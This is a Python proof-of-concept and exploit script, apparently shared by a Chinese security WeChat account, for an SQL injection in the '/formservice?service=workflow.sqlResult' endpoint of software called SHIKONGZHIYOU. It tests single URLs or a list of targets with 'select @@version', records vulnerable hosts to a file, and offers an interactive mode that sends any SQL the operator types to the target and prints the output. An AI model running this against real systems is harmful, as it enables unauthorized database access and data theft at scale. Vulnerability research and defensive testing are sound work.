# _*_ coding:utf-8 _*_
# @Time : 2023/9/16 11:12
# @Author: 为赋新词强说愁
import functools
 
import requests
import argparse
import re
 
requests.packages.urllib3.disable_warnings()
 
 
def usage():
    print('''
    +-----------------------------------------------------------------+
                微信公众号    网络安全透视镜 
    使用方法:
        单个 python3 SHIKONGZHIYOU_poc.py -u url[例 http://127.0.0.1:8080]
        批量 python3 SHIKONGZHIYOU_poc.py -f filename
    +-----------------------------------------------------------------+                                     
    ''')
 
 
# proxies = {'http':'http://127.0.0.1:8080'}
 
def exp(url):
    sql = input("请输入sql语句:")
    if sql == 'exit':
        exit()
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection': 'close',
        'Cookie': 'JSESSIONID=abcfTskygBv73ehavzoNy; __qypid=""; ecology_JSessionId=abcfTskygBv73ehavzoNy; ecology_JSessionid=abcfTskygBv73ehavzoNy',
        'Upgrade-Insecure-Requests': '1',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/json'
    }
    json_data = {
        "params": {"a": "11"},
        "sql": f"{sql}"
    }
    str_data = str(json_data)
    data = (
        f'{json_data}\r\n'
    )
 
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url, headers=header, data=data, verify=False, timeout=3)
        pattern = r'<root>(.*?)</root>'
        match = re.search(pattern, response.text, re.DOTALL)
        print(match.group(1))
    except Exception as e:
        print(e)
 
 
def check_exp(url):
    select = input(f"{url}漏洞存在是否进行利用(1:是,0：否, exit: 退出) ：")
    while select != "exit":
        if select == "1":
            exp(url)
        else:
            break;
 
def poc(url_check,flag):
    if 'http' in url_check:
        url_check = url_check
    else:
        url_check = 'http://' + url_check
    url = url_check + '/formservice?service=workflow.sqlResult'
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection': 'close',
        'Cookie': 'JSESSIONID=abcfTskygBv73ehavzoNy; __qypid=""; ecology_JSessionId=abcfTskygBv73ehavzoNy; ecology_JSessionid=abcfTskygBv73ehavzoNy',
        'Upgrade-Insecure-Requests': '1',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/json'
    }
 
    data = (
        '{"params": {"a": "11"}, "sql": "select @@version"}\r\n'
    )
    flag = flag
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url, headers=header, data=data, verify=False, timeout=3)
        # print(response.text)
        pattern = r'<root>(.*?)</root>'
        match = re.search(pattern, response.text, re.DOTALL)
        # print(match.group(1))
        if match.group(1) != None:
            if flag == 0:
                check_exp(url)
            else:
                print(f"{url_check} 存在SQL注入漏洞")
                with open('result.txt',mode='a',encoding='utf-8') as f1:
                    f1.write(url+'\n')
        else:
            pass
 
    except Exception as e:
        pass
 
 
def run(filepath):
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    flag = 1
    for u in urls:
        poc(u,flag)
 
 
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="SHIKONGZHIYOU_poc.py -u url")
    parse.add_argument("-f", "--file", help="SHIKONGZHIYOU_poc.py -f file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    if url is not None and filepath is None:
        flag = 0
        if 'http' in url:
            poc(url,flag)
        else:
            url = 'http://' + url
            poc(url,flag)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()
 
 
if __name__ == '__main__':
    main()